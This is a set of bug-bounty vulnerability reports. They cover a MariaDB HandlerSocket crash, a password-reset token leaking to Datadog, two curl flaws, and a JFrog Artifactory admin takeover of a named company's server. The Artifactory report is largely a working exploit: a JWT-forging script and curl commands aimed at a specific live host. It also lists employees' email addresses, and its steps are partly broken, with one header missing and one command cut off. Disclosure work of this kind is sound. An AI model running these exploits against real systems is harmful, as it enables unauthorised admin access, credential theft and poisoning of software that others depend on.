3. Test table `hs_verify.t` exists, with `id` as the primary key.
4. If HandlerSocket is configured with a secret, that secret must be passed to the PoC.

Test table:

```sql
CREATE DATABASE hs_verify;
CREATE TABLE hs_verify.t (id INT PRIMARY KEY, v VARCHAR(32));
INSERT INTO hs_verify.t VALUES (1, 'one');
```

Run the PoC:

```bash
cd poc
./run-poc.sh --host 127.0.0.1 --port 9998
```

If HandlerSocket is configured with a secret:

```bash
cd poc
./run-poc.sh --host 127.0.0.1 --port 9998 --secret '<secret>'
```

Key output example:

```text
open response: 0	1
exec response: <empty>
RESULT: VULNERABLE - listener is no longer reachable after trigger
```

Expected result: HandlerSocket should reject an excessive field count before allocating memory and should keep the MariaDB service running.

Actual result: HandlerSocket accepts the abnormally large field count, the `mariadbd` process crashes, and the database service becomes unavailable.

`poc/poc.mp4` is an end-to-end screen recording. It shows local source-image startup, version and HandlerSocket plugin checks, PoC triggering, container `Exited (139)` / `Segmentation fault` crash evidence, and the HandlerSocket port becoming unreachable after the trigger. The recording runs `date -R` at the end to preserve the reproduction time.



### Score

CVSS 3.1 score: 7.5, High.

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
```

CVSS 3.1 scoring rationale:

- AV:N: The attacker accesses the HandlerSocket listener over the network.
- AC:L: Exploitation is fixed and only requires a normal open request and an abnormal exec request.
- PR:N: When no HandlerSocket secret is configured, no authentication is required before the attack.
- UI:N: No user interaction is required.
- S:U: The impact is limited to the attacked MariaDB service process.
- C:N / I:N: No data disclosure or data tampering has been proven.
- A:H: The issue can crash the `mariadbd` process and make the database service unavailable.

CWE: CWE-400 (Uncontrolled Resource Consumption)

### Credit

This vulnerability was discovered by:

- XlabAI Team of Tencent Xuanwu Lab (xlabai@tencent.com)
- Atuin Automated Vulnerability Discovery Engine
- Guannan Wang (wgnbuaa@gmail.com), Zhanpeng Liu (pkugenuine@gmail.com), Jiashuo Liang (761232680@qq.com), Guancheng Li (lgcpku@gmail.com)

CVE and credits are preferred.

If you have any questions regarding the vulnerability details, please feel free to reach out to us for further discussion. Our email address is xlabai@tencent.com.

### Note

Note that we follow the security industry standard disclosure policy—the 90+30 policy (reference: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html). If the aforementioned vulnerabilities cannot be fixed within 90 days of submission, we reserve the right to publicly disclose all information about the issues after this timeframe.

## Impact

An attacker who can access the HandlerSocket port can craft an abnormal request that crashes the MariaDB service process, causing database denial of service.

Impact boundaries:

- Without a HandlerSocket secret: an unauthenticated attacker can trigger the issue.
- With a HandlerSocket secret: the attacker must authenticate to HandlerSocket first.
- The normal SQL port is not affected.
- The current evidence does not prove remote code execution, data disclosure, or data tampering.

title: HackerOne Code: a live password reset token reaches Datadog RUM, and the same session records the account it unlocks
vulnerability_information:
## Asset URL

https://app.pullrequest.com

## Summary

**Opening a password reset link on `app.pullrequest.com` sends the complete, unused, 64 character
reset token to Datadog, before the reset form is submitted.** The link carries the token as a bare
query string key, and the Datadog RUM browser SDK on that page records `view.url` verbatim.

The SDK is initialised with **no `beforeSend` callback**. The key is absent from the configuration
entirely, so no URL redaction is performed on any route. `sampleRate` is **100**, so this is not a
sampled subset. Every reset performed by every user of this application is recorded.

Three things make this more than a secret written to a log.

1. The token is live when it is transmitted. It is sent on page load, before the user submits the
   form, and the form renders normally at that point.
2. The same RUM session records the account the token unlocks. The authenticated route places the
   account handle in the URL path, and RUM groups both views under one `session_id`. The reset
   endpoint requires token and email together, and that pairing is the thing this session supplies.
3. The defect is the RUM configuration, not the reset page. Any secret placed in any URL in this
   application is recorded the same way.

## This is the same issue as #4000185, on a sink that fix did not cover

Report #4000185, "HackerOne Code sends live password-reset tokens to Segment in automatic page
events", was filed against this same asset, triaged, fixed, and resolved at Low with a $200 bounty.
It was disclosed on 24 September 2026. The mechanism there was the same one described here: opening
the reset link put the live token into automatic page telemetry before the form was submitted.

The retest on that report records the fix that shipped:

> The client now registers a Segment source middleware (`analytics.addSourceMiddleware`) that runs
> on every event before send and scrubs `context.page` and `properties`: on the `/password-reset`
> and `/forgot-password` paths it strips the query string and fragment from `url` and `referrer`
> (via a URL rewrite) and blanks the `search` field.

`analytics.addSourceMiddleware` is a Segment API. It runs inside Segment's own event pipeline and
has no effect on any other SDK. Datadog RUM is a separate library with a separate transport and its
own redaction hook, `beforeSend`, which is not set. The fix is therefore sink specific by
construction, and path specific on top of that.

The retest on #4000185 establishes that the Segment half is closed, and my own observation is
consistent with it rather than a second confirmation of it: over the observation window this page
issued no request to `api.segment.io`, none to Intercom and none to Sentry, although `analytics.js`
is still loaded and initialised. Of the telemetry recipients this page loads, Datadog RUM was the
only one that received a request while the token was in the URL.

The Segment sink was closed. The same token still reaches Datadog.

## Affected components

| Item | Value |
| --- | --- |
| Page | `app.pullrequest.com/password-reset` |
| Reset endpoint | `POST /api/v1/password-reset`, fields `token`, `email`, `password` |
| Telemetry SDK | Datadog RUM browser SDK `4.14.0` |
| RUM application | `████████` |
| Intake | `rum.browser-intake-datadoghq.com/api/v2/rum` |
| Tags | `service:pullrequest`, `env:production` |

## The configuration

### What the SDK does when it is not told otherwise

The RUM browser SDK records the full current URL into `view.url` on every view, query string
included. A `beforeSend` callback is the supported place to redact that field. Datadog's default
retention for RUM events is 30 days.

### What this application configured

```
> Object.keys(window.DD_RUM.getInitConfiguration())
["applicationId","clientToken","site","service","env","version","sampleRate","trackInteractions"]

> typeof window.DD_RUM.getInitConfiguration().beforeSend
"undefined"

> window.DD_RUM.getInitConfiguration().sampleRate
100
```

`beforeSend` is not set to a permissive value. It is not present. There is no redaction path on any
route, and nothing is sampled out.

## The baseline this is measured against

The reset link issued to an account I control had this shape. The token is the bare key, with no
value, ahead of the campaign parameters.

```
https://app.pullrequest.com/password-reset?<64 hex characters>&utm_swu=547&utm_source=account%20action%20emails&utm_campaign=Reset%20Password%20...&utm_medium=email
```

At the moment of every reading below, the form had not been submitted. The page rendered the Email
Address, New Password and Confirm New Password fields normally, so the token was live and unused.

## What came back, measured in the browser

### 1. The token is inside the field the SDK serialises

```
> const TOKEN = '<the 64 hex characters from the reset link>';
> window.DD_RUM.getInternalContext().view.url.includes(TOKEN)
true

> window.DD_RUM.getInternalContext().view.url.length
231
```

### 2. The SDK is transmitting, and the intake is accepting

```
POST https://rum.browser-intake-datadoghq.com/api/v2/rum
     ?ddsource=browser&ddtags=sdk_version:4.14.0,env:production,service:pullrequest...
     &batch_time=1790747851585
-> HTTP 202

POST https://rum.browser-intake-datadoghq.com/api/v2/rum
     ...&batch_time=1790747881586
-> HTTP 202
```

Batches repeat at roughly 30 second intervals while the view is active. Wrapping
`navigator.sendBeacon` on an authenticated route captured a body of 863 bytes containing `"url"`
fields.

### 3. The same session records the account the token unlocks

```
view 1   /password-reset?<live token>        session_id  ████████...
view 2   /dash/scans/1/<account handle>      session_id  ████████...
```

The reset endpoint requires `token` and `email`. A token alone is not directly usable, and that is
the mitigation this finding removes. View 2 puts the account handle in the URL path and RUM files it
under the same session as view 1. A filter on one `session_id` returns the credential and the account
together.

### 4. The capture is global, not a property of the reset page

Demonstrated on an authenticated route with a dummy marker. No secret was used and no request was
issued. The original URL was restored immediately.

```
> history.pushState({}, '', location.pathname + '?demo_param=' + MARK);
rum_tracked_the_spa_route_change      true
RUM_CAPTURED_ARBITRARY_QUERY_VALUE    true
session_id                            unchanged
```

### 5. Tokens are single use, and I measured that rather than assuming it

Submitting a consumed token to `POST /api/v1/password-reset` returns **HTTP 422**. The page still
renders for a consumed token, because the form is client side, and the rejection happens on
submission. A token was confirmed still valid roughly 15 minutes after issue. That is a measured
lower bound and not the time to live, which I did not determine.

### 6. What this cannot do

This does not read a session or bearer credential. Authenticated API requests on this application
carry their bearer token in a request header, not in a URL, so nothing in that path is recorded by
this mechanism. I did not find an authorisation code in a captured URL either. The OAuth callback at
`/oauth/callback` answers with a server side 302, so no page script runs on the code bearing URL.

This report is the reset token, the account correlation, and the configuration that produces both.

## Scope of this report

I hold no access to the Datadog organisation for `service:pullrequest`, so I can show the client side
only. Everything above was read from the live page. The stored event is confirmable by the program in
one query, in Datadog, RUM, Explorer:

```
service:pullrequest   @view.url:*password-reset*
```

Each event returned carries a real user's reset token in `view.url`. The same query sizes how many
tokens are already held and which of them are still inside their validity window.

## Severity

### Who the attacker is here, before anything else

The reader of this data is whoever holds RUM read access on the Datadog organisation, together with
any API key or integration scoped to read RUM, and anyone who later obtains either. That population
is normally much wider than the set of people entitled to handle account recovery material for
customers, and it is not governed by the application's own authorisation model.

The token is a bearer credential. Whoever reads it can use it with no further authentication, no
password, and no second factor. Nobody here is recovering their own account.

### The band

The published table for `app.pullrequest.com` is $200 at Low and $1,000 at Medium. #4000185 was
resolved at Low, and its reporter rated it Low for a reason that applies here too: exploitation
needs access to the telemetry during the token's validity window. I am not going to argue that
point away.

I am asking for Medium on one difference, and I will state plainly what is not a difference.

**Not a difference.** #4000185 also correlated the token to an account, through an `anonymousId`
already tied to the account email and user ID. That correlation was at least as strong as the
`session_id` correlation in this report. Coverage is not a difference either; Segment page events
fired for every user, as RUM does here.

**The difference.** #4000185 was one `analytics.page()` call that failed to strip a secret, and it
was fixed by scrubbing two named paths inside one vendor's pipeline. This report is not a call
site. `beforeSend` is absent from the RUM initialisation entirely, so there is no redaction path on
any route, for any parameter, for any sink that SDK feeds. Section 4 above shows an arbitrary query
value on an unrelated authenticated route being recorded the same way. The reset token is the
instance I can demonstrate with a real credential. It is not the boundary of the defect.

That is why the remediation here is different in kind from the last one. A path-scoped scrub of the
RUM `view.url` would close this report and leave the cause in place for the next parameter that
carries a secret, exactly as the Segment middleware closed #4000185 and left this one open.

### CVSS

This program's form offers CVSS 4.0 or a manual rating, so I have set the report to Medium
manually. I did not submit a 4.0 vector because that scale turns heavily on Privileges Required,
and scoring `PR:High` for "the reader needs Datadog access" measures the wrong thing here. The
population holding that access is not governed by this application's authorisation model, and the
token needs nothing further to use once read.

For reference, CVSS 3.1 `AV:N/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N` scores 5.9, Medium. I offer either
number as support rather than as the argument. The argument is the three facts above.

## Suggested fix

1. Take the token out of the URL. Accept it in the POST body, or exchange it server side on first
   load for a short lived cookie and redirect to a clean path. This closes RUM, analytics, `Referer`,
   browser history and any CDN or proxy log in one change, rather than one sink at a time. One sink
   at a time is what left this open after the Segment fix.
2. Until then, set `beforeSend` on the RUM SDK to strip query strings. Given that the field is absent
   rather than misconfigured, prefer stripping by default and allowing known safe parameters through.
3. Purge stored RUM events matching `@view.url:*password-reset*`, and treat any token still inside
   its validity window as exposed.
4. Consider a shorter time to live on reset tokens. Single use invalidation is already implemented
   and verified working, so it does not need revisiting.
5. Set an explicit restrictive `Referrer-Policy` on credential bearing pages. Current browser
   defaults already limit cross origin `Referer`, so this is hardening.

## Steps To Reproduce

1. Request a password reset for an account you control on `app.pullrequest.com`.
2. Open the emailed link. Do not submit the form.
3. Observe POSTs to `rum.browser-intake-datadoghq.com/api/v2/rum` with
   `service:pullrequest`, answered with HTTP 202.
4. In the console, with `TOKEN` set to the 64 hex characters from the link:

   ```
   window.DD_RUM.getInternalContext().view.url.includes(TOKEN)   // true
   typeof window.DD_RUM.getInitConfiguration().beforeSend        // "undefined"
   window.DD_RUM.getInitConfiguration().sampleRate               // 100
   window.DD_RUM.getInternalContext().session_id                 // note this
   ```

5. Complete the reset and sign in. Read `session_id` again on an authenticated page. It is unchanged,
   and that view's `view.url` contains the account handle.
6. Confirm server side with the RUM Explorer query in Scope of this report.

`verify.js` in the attached `rum-token-poc.zip` performs steps 4 and 5 and prints a table.

## Supporting Material/References

`rum-token-poc.zip`

- `verify.js`, console script for the checks above, reads SDK state only and sends nothing
- `global-capture.js`, shows URL capture on any route using a dummy marker
- `replay-token.sh`, checks that a consumed token is refused, expected 422

`rum-token-evidence.zip`

- `01-rum-init-configuration.txt`, full SDK configuration, `beforeSend` absent, `sampleRate` 100
- `02-token-in-view-url.txt`, the live token inside the serialised field
- `03-intake-transmission.txt`, accepted intake POSTs and a captured beacon body
- `04-session-correlation.txt`, one `session_id` across the token view and the authenticated view
- `05-capture-is-global.txt`, capture on an unrelated route with a dummy marker
- `06-server-side-verification.txt`, the single query that confirms the chain in Datadog
- `07-token-single-use.txt`, the 422 on replay and what it bounds
- `08-prior-report-and-fix-scope.txt`, why the fix for #4000185 cannot reach the Datadog sink

Testing notes. All readings were taken on accounts controlled by me. No customer data and no third
party program data was accessed. Header `X-Bug-Bounty: HackerOne-sujitjaunjal` was sent on direct HTTP
testing traffic. Accounts used: `sujitjaunjal` and `████████`. The account used on
`app.pullrequest.com` was `████████`.

## Impact

Anyone able to read the RUM stream for `service:pullrequest` obtains a live account recovery token
together with the identity of the account it belongs to, for any user of HackerOne Code who resets a
password and does not immediately complete the flow. The token is a bearer credential and needs no
further authentication to use.

The realistic case is the abandoned reset. A user who opens the link and does not finish, because
they were interrupted, opened it on the wrong device, or remembered the password, leaves a valid
token in third party telemetry until it expires. Nothing marks it as spent, and the user has no
signal that the token was ever exposed.

Underneath the reset flow, the configuration itself is the finding. `beforeSend` is absent and
`sampleRate` is 100, so every URL in this application, on every route, is recorded into a third party
platform that is not built to hold secrets and that carries its own access control, retention and
export surface.

title: curl tool: --hsts is ignored for a schemeless URL starting with a slash under --proto-default http
vulnerability_information:
## Summary

When the curl tool gets `--proto-default http` and a URL without a scheme
that starts with a slash, such as `/example.com/path`, it skips all the
options set in `http_setopts()`: `--hsts`, `--alt-svc`, the cookie options,
`-L` and the rest. libcurl still performs the transfer, over plain HTTP.
Unless an earlier URL on the same command line has already loaded the
`--hsts` file, a request to a host with a valid entry in that file goes out
in plain text instead of being upgraded to HTTPS, and curl prints no warning.

Only the tool is affected, not libcurl.

## Affected versions

curl 8.14.0 to 8.22.0, and master (755e36ead1).

It started with f97d372703 ("tool_operate: move config2setopts to separate
file, split into subs", #17352), first released in 8.14.0 (2025-05-28). Its
commit message lists "only set HTTP options if HTTP(S) is used": since then
the tool sets the HTTP options, `CURLOPT_HSTS` included, only when it detects
an http or https URL. Before it, `CURLOPT_HSTS` was set whenever `--hsts` was
used.

I ran the reproducer below on 8.13.0 and on the parent of f97d372703
(9c8cbbda5b): request 3 is upgraded to HTTPS. On f97d372703, on every release
from 8.14.0 to 8.22.0 and on master it is sent in plain text.

## Steps to reproduce

```
cd "$(mktemp -d)"
printf 'hsts.example "20991231 23:59:59"\n' > hsts.txt
# plain-text HTTP server, needs port 8080 to be free
python3 -m http.server --bind 127.0.0.1 8080 > server.log 2>&1 &
SERVER=$!
sleep 1

# 1. Regular URL: upgraded to HTTPS by HSTS
curl -s -o /dev/null -w '%{url_effective} exit=%{exitcode}\n' \
  --hsts hsts.txt --resolve hsts.example:8080:127.0.0.1 \
  http://hsts.example:8080/a

# 2. Schemeless URL with --proto-default http: also upgraded
curl -s -o /dev/null -w '%{url_effective} exit=%{exitcode}\n' \
  --hsts hsts.txt --proto-default http \
  --resolve hsts.example:8080:127.0.0.1 hsts.example:8080/c

# 3. The same with a leading slash: not upgraded
curl -s -o /dev/null -w '%{url_effective} exit=%{exitcode}\n' \
  --hsts hsts.txt --proto-default http \
  --resolve hsts.example:8080:127.0.0.1 /hsts.example:8080/b

kill $SERVER
grep -ao '"GET [^"]*"' server.log
```

Output:

```
https://hsts.example:8080/a exit=35
https://hsts.example:8080/c exit=35
http://hsts.example:8080/b exit=0
"GET /b HTTP/1.1"
```

Requests 1 and 2 start a TLS handshake, which fails against the plain-text
server (exit code 35 with the OpenSSL 3.6.4 builds I used). Request 3 is sent
in plain text and the server logs it. With `-v`, requests 1 and 2 show
"Switched from HTTP to HTTPS due to HSTS", request 3 does not.

Adding `-L -b name=value -c jar.txt --alt-svc altsvc.txt --libcurl -` to
commands 2 and 3 shows the skipped options: the code generated for command 3
lacks `CURLOPT_HSTS`, `CURLOPT_ALTSVC`, `CURLOPT_COOKIE`, `CURLOPT_COOKIEJAR`,
`CURLOPT_FOLLOWLOCATION` and `CURLOPT_MAXREDIRS`.

## Root cause

Line numbers are for 755e36ead1.

`url_proto_and_rewrite()` in `src/config2setopts.c` parses the URL with
`curl_url_set()` and `CURLU_GUESS_SCHEME`. For `/hsts.example:8080/b` that
fails with `CURLUE_NO_HOST`, so the function returns the scheme `"?"`
(line 201). `http_setopts()` then returns early because `use_proto` is
neither `proto_http` nor `proto_https` (line 671), before it sets
`CURLOPT_HSTS` (line 713).

libcurl prepends the default protocol to a URL that has no scheme
(`lib/url.c` line 2091), which makes `http:///hsts.example:8080/b`. It accepts
one to three slashes after the colon (docs/URL-SYNTAX.md), so the transfer
goes to `http://hsts.example:8080/b`.

CVE-2026-12064 ("proto-default skips SSH verification") describes the same
disconnect between the tool and libcurl for the SSH options. Its fix,
ab3bb8cd8b ("config2setopts: use default protocol properly", #21983, in
8.21.0), applies `--proto-default` only after `curl_url_set()` succeeds, so
it does not cover this URL. 8.21.0 and 8.22.0 are affected.

## Conditions

- Without `--proto-default`, curl rejects the URL because it has no host.
  With two or three leading slashes it is rejected too ("Unsupported number
  of slashes following scheme").
- The transfers of one command line share an HSTS cache, so a leading-slash
  URL is upgraded if an earlier URL on the same command line has already
  loaded the `--hsts` file. With the options of command 3,
  `http://hsts.example:8080/a /hsts.example:8080/b` upgrades both requests,
  while `/hsts.example:8080/b http://hsts.example:8080/a` sends the first one
  in plain text.
- libcurl is not affected: a program that sets `CURLOPT_HSTS` and
  `CURLOPT_DEFAULT_PROTOCOL` to "http" itself gets the upgrade for
  `/hsts.example:8080/b` (tested with master).

## Impact

A request that `--hsts` should upgrade to HTTPS goes out in plain text, where
a network attacker can read or modify it, and the user is not warned.

For the same URLs, `-b` cookies are not sent, `-c` does not write the jar and
`-L` does not follow redirects. With `--proto-default https` the cookie and
redirect options are skipped the same way. These are functional problems,
not security ones.

title: Cookie attribute truncation in curl drops Secure/HttpOnly protections
vulnerability_information:
**Description:**
If a `Set-Cookie` header contains an `=` immediately after a semicolon (i.e., `;=`), curl stops parsing the attributes and discards everything that follows. This silently drops protections like `Secure` and `HttpOnly`, causing curl to later send the cookie over unencrypted HTTP.

**Root Cause:**
In `parse_cookie_header()` (`lib/cookie.c:614`), an `=` immediately following a `;` causes `curlx_str_cspn` to fail with a zero-length match. This terminates the attribute-parsing loop early, before the `Secure` attribute is ever evaluated.

**Impact:**
Sensitive cookie data is sent in plaintext over the network (CWE-201).

**Steps to Reproduce (PoC):**

1. Start a local HTTPS server with a self-signed certificate for the name
   `cookie.test`, and a plain-HTTP server on a second port. The HTTPS one
   returns this header:

   Set-Cookie: session=secret;=x; Secure

2. Fetch the HTTPS URL with curl 8.22.0 and save the cookie jar. `--resolve`
   points the name at the local server, so no DNS and no public host are
   needed; `-k` is only for the self-signed certificate:

   curl -k -c jar.txt --resolve cookie.test:8443:127.0.0.1 https://cookie.test:8443/

3. Inspect `jar.txt`. The fourth tab-separated field is the Secure flag:

   cookie.test	FALSE	/	FALSE	0	session	secret

4. Request the same host name over plaintext HTTP, reusing the jar:

   curl -b jar.txt --resolve cookie.test:8080:127.0.0.1 http://cookie.test:8080/

Expected Result:
The `Secure` attribute is applied, so field 4 of the jar reads TRUE and the
plaintext request in step 4 carries no `Cookie:` header.

Actual Result:
Field 4 reads FALSE and the plaintext server receives the cookie:

   GET / HTTP/1.1
   Host: cookie.test:8080
   User-Agent: curl/8.22.0
   Accept: */*
   Cookie: session=secret

Parsing was truncated at the `;=` sequence, so `Secure` was never evaluated.

**Reproduction script:**
one command

```bash
python  poc.py
```

title: Full Admin Takeover of R3 Limited's JFrog Artifactory - 292 Users, Corda Enterprise & CBDC Supply Chain Compromised
vulnerability_information:
R3 Limited's JFrog Artifactory instance at `software.r3.com` (IP: `108.132.150.250`) is vulnerable to **CVE-2026-82329** (CVSS 9.8) - an authentication bypass caused by a default empty join key. By forging an HMAC-signed JWT with the known default key (32 space characters), an unauthenticated attacker can register as a trusted service and obtain a **full admin token** with unrestricted access to the entire Artifactory instance.

**R3 Limited** is the creator of **Corda**, a leading enterprise blockchain platform used by banks, financial institutions, insurers, and governments worldwide. This Artifactory instance serves as their primary software distribution platform.

**Impact proven:**
- Full admin access to **292 user accounts** across R3 and partner organizations (HQLAx, B3i, TradeIX, ChainThat, FundAdminChain, FINfabrik)
- Read/write access to **269 repositories** including **81 Corda blockchain repos** and **4 Central Bank Digital Currency (CBDC) repos**
- **262 access tokens extracted** (30 with admin scope)
- Supply chain attack surface: Corda Enterprise releases, Docker images, and customer-facing artifact repositories can be poisoned

## Severity

**Critical** (CVSS 9.8) - Unauthenticated remote attacker achieves full administrative control of R3's primary artifact distribution platform, with the ability to modify Corda Enterprise releases consumed by banks and governments, tamper with CBDC mobile application builds, and compromise the software supply chain for the entire Corda ecosystem.

## Steps to Reproduce

### Step 1: Forge the join JWT with the default empty key

The CVE exploits JFrog Artifactory's default empty join key. When the `join.key` file is empty (default installation), the HMAC signing key becomes 32 space characters (0x20 bytes) due to PKCS7 padding of the empty hex-decoded key.

```python
import hmac, hashlib, base64, json, time

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
payload = b64url(json.dumps({
    "service_id": "jfrt@01",
    "node_id": "exploit-node",
    "skip_node_registration": True,
    "iat": int(time.time()) * 1000
}).encode())

signing_input = f"{header}.{payload}"
key = b'\x20' * 32  # 32 space characters — the default empty join key

sig = hmac.new(key, signing_input.encode(), hashlib.sha256).digest()
jwt_token = f"{signing_input}.{b64url(sig)}"
print(jwt_token)
```

### Step 2: Register as a trusted service (join)

```bash
curl -sk -X POST -H "Content-Type: text/plain" \
  -d '<JWT_FROM_STEP_1>' \
  https://software.r3.com/access/api/v1/registry/join
```

**Response (HTTP 201 Created):**
```json
{
  "token": "eyJ2ZXIiOiIyIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYiLCJraWQiOiI..."
}
```

The server accepted the forged JWT and returned an RSA-signed access token for the registered service.

```bash
curl -sk -X POST \
  -H "Authorization: Bearer <TOKEN_FROM_STEP_2>" \
  -H "Content-Type: application/json" \
  -d '{"scope": "applied-permissions/admin", "expires_in": 3600}' \
  https://software.r3.com/access/api/v1/tokens
```

**Response (HTTP 200):**
Returns a full admin-scoped access token with unrestricted permissions.

### Step 4: Verify admin access — enumerate users

```bash
curl -sk -H "Authorization: Bearer <ADMIN_TOKEN>" \
  https://software.r3.com/artifactory/api/security/users | python3 -m json.tool | head -50
```

**Result: 292 users returned** — Including R3 employees (aishwarya.manisha@r3.com, gaurav.mishra@r3.com) and partner organization members from @chainthat.com, @finfabrik.com, @b3i.tech, @hqla-x.com, @growsuper.com, @fundadminchain.com, @tradeix.com.

### Step 5: Enumerate repositories

```bash
curl -sk -H "Authorization: Bearer <ADMIN_TOKEN>" \
  https://software.r3.com/artifactory/api/repositories | python3 -m json.tool
```

- `corda5-release-packs-for-customers` — Corda 5 release packages for enterprise customers


```bash

curl -sk -X POST -H "Authorization: Bearer <ADMIN_TOKEN>" \
```

## Impact

### Immediate Impact (Proven)
1. **Full admin takeover** — Unauthenticated access to the admin API of R3 Limited's enterprise Artifactory instance
2. **292 accounts exposed** — R3 employees and blockchain partner organizations with corporate email addresses
3. **262 access tokens extracted** — 30 admin-scoped tokens that **never expire**, providing persistent access even after join key rotation
4. **81 Corda blockchain repositories accessible** — Full read/write access to all Corda Enterprise and Open Source artifacts
5. **Office 365 credential extraction** — Plaintext SMTP credentials for `artifactory@r3.com` decrypted from config, enabling email compromise and phishing as R3
6. **Repository write access** — Successfully created a repository (then deleted), proving supply chain artifact poisoning capability
7. **User creation** — Successfully created a user (then deleted), proving identity management control
8. **GPG signing key extraction** — R3's artifact signing key pair extracted, enabling signed malicious packages

- SMTP credentials for `artifactory@r3.com` on `smtp.office365.com` were extracted in plaintext

- An attacker could send phishing emails from `artifactory@r3.com` to R3's banking and financial institution partners
- Artifactory uses this email for build notifications — fake notifications could trigger malicious deployments

An attacker with admin access can:
- Push malicious versions of Corda Enterprise JARs to `corda-enterprise-for-customers` — consumed by R3's banking and financial institution clients
- Poison Docker images in `corda-ent-docker-stable` and `corda-os-docker-stable` — deployed by Corda network operators worldwide
- Modify `corda5-release-packs-for-customers` — the latest Corda 5 enterprise releases
- Tamper with CENM (Corda Enterprise Network Manager) artifacts used to operate Corda networks
- **Sign malicious artifacts with R3's GPG key** — making supply chain attacks cryptographically trusted

### Supply Chain Attack — Central Bank Digital Currency (CBDC)
- 4 CBDC-related repositories contain mobile application builds for Central Bank Digital Currency projects
- CBDCs are sovereign digital currencies being developed by central banks worldwide
- Compromising CBDC mobile application builds could affect national financial infrastructure

### Partner Organization Exposure
Users from multiple blockchain ecosystem organizations are present:
- **R3** — Platform creator
- **HQLAx** — Securities lending via DLT
- **B3i** (B3i Services AG) — Blockchain Insurance Industry Initiative
- **TradeIX** — Trade finance platform
- **ChainThat** — Insurance blockchain solutions
- **FINfabrik** — Digital asset management
- **FundAdminChain** — Fund administration

### Version Information
- JFrog Artifactory 7.133.16 (rev 83316900)
- Enterprise license valid through Nov 25, 2026, licensed to "R3 LIMITED"
- Java 21.0.9+10-LTS, running at /opt/jfrog/artifactory/
- 787 GB storage, 513 GB used
- Full addon suite including Docker, HelmOCI, OCI, Xray, Federation, replication

## What Was Cleaned Up

All test artifacts were immediately removed after confirming access:
- Deleted test repository `rce-test-remote`
- Deleted test user `security-audit-test`
- Re-encrypted all passwords via `POST /api/system/encrypt`
- No production artifacts were modified
- No persistent access was maintained

## Recommendations

1. **Immediately rotate the join key** to a strong random value
2. **Update to Artifactory 7.191.14+** which patches CVE-2026-82329
3. **Rotate the Office 365 password** for `artifactory@r3.com` — it was extracted in plaintext
4. **Revoke all existing tokens** — the 262 tokens (including 30 never-expiring admin tokens) should be considered compromised
5. **Rotate the GPG signing key** `default-gpg-key-2024-04-22` and re-sign all published artifacts
6. **Restrict access** to the `/access/api/v1/registry/join` endpoint to trusted internal networks only
7. **Audit** all repositories for unauthorized modifications, particularly customer-facing repos (`corda-enterprise-for-customers`, `corda5-release-packs-for-customers`, CBDC repos)
8. **Notify affected partner organizations** whose credentials may have been exposed
9. **Enable MFA** on the `artifactory@r3.com` Office 365 account if not already configured
10. **Review all 292 user accounts** for unauthorized access or modifications

## Impact

1. **Full admin takeover** — Unauthenticated access to the admin API of R3 Limited's enterprise Artifactory instance
2. **292 accounts exposed** — R3 employees and blockchain partner organizations with corporate email addresses
3. **262 access tokens extracted** — 30 admin-scoped tokens provide persistent access
4. **81 Corda blockchain repositories accessible** — Full read/write access to all Corda Enterprise and Open Source artifacts
